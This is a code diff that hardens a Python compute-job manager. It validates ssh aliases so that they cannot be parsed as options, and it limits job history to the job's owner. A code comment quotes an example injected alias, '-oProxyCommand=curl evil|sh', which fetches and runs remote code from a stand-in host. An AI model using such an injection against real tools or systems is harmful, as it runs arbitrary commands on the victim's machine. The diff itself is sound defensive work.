@@ -178,6 +178,28 @@ def _safe_remote_path(value: str, *, label: str) -> str:
     return text
 
 
+#: An ssh destination: an optional user, then a host or a ~/.ssh/config alias.
+#: Deliberately not a general string. `ssh` parses a leading `-` as an option,
+#: so an "alias" of `-oProxyCommand=curl evil|sh` runs an arbitrary command on
+#: *this* machine before any connection is attempted -- and the alias reaches
+#: `_split` from a provider string an agent supplies.
+_SSH_ALIAS = re.compile(r"^(?:[A-Za-z0-9._-]+@)?[A-Za-z0-9][A-Za-z0-9._-]*$")
+
+
+def _safe_alias(value: str) -> str:
+    """An ssh destination that cannot be read as an option or a second word."""
+    text = str(value or "").strip()
+    if not text:
+        raise ComputeError("ssh alias must not be empty", "invalid_request")
+    if not _SSH_ALIAS.fullmatch(text):
+        raise ComputeError(
+            f"ssh alias {text!r} is not a plain [user@]host name; "
+            "an alias that begins with '-' is parsed by ssh as an option",
+            "invalid_request",
+        )
+    return text
+
+
 def _safe_stage_name(value: str, *, label: str) -> str:
     """A staged input lands flat in the archive root, so its name is a name.
 
@@ -1497,12 +1519,29 @@ class ComputeManager:
         }
 
     def job_history(self, kw: dict) -> dict:
-        """The append-only event stream for one job."""
+        """The append-only event stream for one job, for its owner only.
+
+        `result` and `cancel` both resolve through `self._jobs`, which
+        `_rehydrate` populates owner-scoped -- so they answer only about jobs
+        this session submitted. This method reached past that into the store
+        with a caller-supplied id and no test at all, which made the event
+        stream of *any* job on the installation readable from *any* session:
+        submitted command, remote host, phases, failure reasons, harvest
+        manifests.
+
+        Same predicate as its siblings, so a job id that is not ours is
+        indistinguishable from one that does not exist.
+        """
+        job_id = kw["job_id"]
+        with self._lock:
+            known = job_id in self._jobs
+        if not known:
+            raise ComputeError(f"no such job {job_id!r}", "not_found")
         if self._store is None:
-            return {"job_id": kw.get("job_id"), "events": []}
+            return {"job_id": job_id, "events": []}
         return {
-            "job_id": kw["job_id"],
-            "events": self._store.compute_job_events(kw["job_id"]),
+            "job_id": job_id,
+            "events": self._store.compute_job_events(job_id),
         }
 
     def confinement_status(self) -> dict:
@@ -1596,6 +1635,11 @@ class ComputeManager:
                 f"'byoc:<id>' or 'ssh:<alias>'",
                 "invalid_request",
             )
+        if fam == "ssh":
+            # Every ssh/scp argv in this module takes its destination from
+            # here, so this one check covers all of them -- rather than each
+            # call site remembering.
+            rest = _safe_alias(rest)
         return fam, rest
 
     def _byoc(self, pid: str) -> dict:
